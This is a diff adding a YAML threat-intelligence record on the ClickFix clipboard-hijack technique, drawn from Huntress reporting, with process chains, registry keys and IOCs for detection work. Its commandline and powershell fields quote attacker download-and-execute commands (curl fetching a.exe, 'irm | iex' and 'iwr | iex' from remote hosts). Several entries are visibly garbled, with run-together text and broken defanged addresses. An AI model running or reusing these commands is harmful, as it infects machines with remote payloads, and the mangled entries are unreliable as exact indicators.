@@ -1,0 +1,72 @@
+description: "Malicious copy\u2011and\u2011paste technique that hijacks the clipboard\
+  \ to execute attacker supplied commands via Run dialog, File Explorer, PowerShell\
+  \ or a fake download."
+attribution: Unknown threat actor (publicly reported by Huntress and DFIR Report)
+TTPs:
+  processes:
+  - explorer.exe
+  - conhost.exe
+  - cmd.exe
+  - curl.exe
+  - chrome.exe
+  - powershell.exe
+  - calc.exe
+  commandline:
+  - explorer.exe
+  - '"C:\\Windows\\system32\\conhost.exe" --headless cmd /c cd /D C:\\Users\\Bob &&
+    curl -s -oa.exe hxxp://213.209.150].]188:8112/a.exe && conhost.exe --headless
+    a.exe && REM Byconhost.exe pressing the enter button you confirm you are not a
+    bot'
+  - cmd /c cd /D C:\\Users\\Bob && curl -s -o a.exe hxxp://213.209.150][.]188:8112/a.exe
+    && conhost.exe --headless a.exe && REM By pressing the enter buttonyou confirm
+    you are not a bot- curl -s -0 a.exe hxxp://213.209.150[.]188:8112/a.exe
+  - explorer.exesty K HKU\\S-1-5-21-1985038317-3109840602-4175505345-1000\\Software\\registry
+    key Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\aconhost.exe --headless
+    cmd /c cd /D C:\\Users\\Bob && curl -s -0 a.exereg istry val ue hxxp://213.209.150].]188:8112/a.exe
+    && conhost.exe --headless a.exe && REMBy pressing the enter button you confirm
+    you are not a bot\\1chrome.exe
+  - 'powershell.exe irm blake-wright-andora-learners.trycloudflare[.Jcom/rhugei.jpg
+    | iex #chrome.exeComputer\\HKEY_USERS\\S-1-5-21-1985038317-3199840602-4175505345-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPathsregistry
+    keypowershell.exe irm blake-wright-andora-learners.trycloudflare[.Jcom/rhugei.jpg
+    | iex #registry valuepowershell.exe iwr -useb hxxp://93.185.166[.]113/troubleshoot.ps1
+    | iexchrome.exeC:\\Windows\\system32\\cmd.exe /c \"\\Users\\Bob\\Downloads\\repairtool.cmd\"\"calc.exechrome.exefile
+    created C:\\Users\\Bob\\Downloads\\repairtool.cmd:Zone.ldentifierfile stream created
+    Contents:[ZoneTransfer] Zoneld=3 ReferrerUrl=http://127.0.0.1:5500/failure.htmlfile
+    stream created Contents: @echo off calc.exe exit'
+  powershell:
+  - 'powershell.exe irm blake-wright-andora-learners.trycloudflare[.Jcom/rhugei.jpg
+    | iex #chrome.exeComputer\\HKEY_USERS\\S-1-5-21-1985038317-3199840602-4175505345-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPathsregistry
+    keypowershell.exe irm blake-wright-andora-learners.trycloudflare[.Jcom/rhugei.jpg
+    | iex #registry valuepowershell.exe iwr -useb hxxp://93.185.166[.]113/troubleshoot.ps1
+    | iex'
+  scripting_engine: []
+  registry_keys:
+  - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\aconhost.exe
+  - HKEY_USERS\\S-1-5-21-1985038317-3199840602-4175505345-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths
+  image_load: []
+  network_connections:
+  - process: conhost.exe
+    destination: hxxp://213.209.150].]188:8112/a.exe
+  - process: powershell.exe
+    destination: hxxp://93.185.166[.]113/troubleshoot.ps1
+  file_activity:
+  - C:\\Users\\Bob\\Downloads\\repairtool.cmd
+  - C:\\Users\\Bob\\Downloads\\repairtool.cmd:Zone.Identifier
+  persistence: []
+  process_relations:
+  - explorer.exe -> conhost.exe (headless) -> cmd.exe -> curl.exe
+  - chrome.exe -> powershell.exe -> iwr download
+  - powershell.exe -> cmd.exe -> repairtool.cmd
+IOCs:
+  ip_addresses:
+  - 213.209.150.188
+  - 93.185.166.113
+  domains: []
+  urls:
+  - hxxp://213.209.150].]188:8112/a.exe
+  - hxxp://93.185.166[.]113/troubleshoot.ps1
+authors:
+- Tyler Bohlmann
+reference: https://www.huntress.com/blog/dont-sweat-clickfix-techniques
+date_of_publication: September 29, 2025
+file_creation_date: October 01, 2025
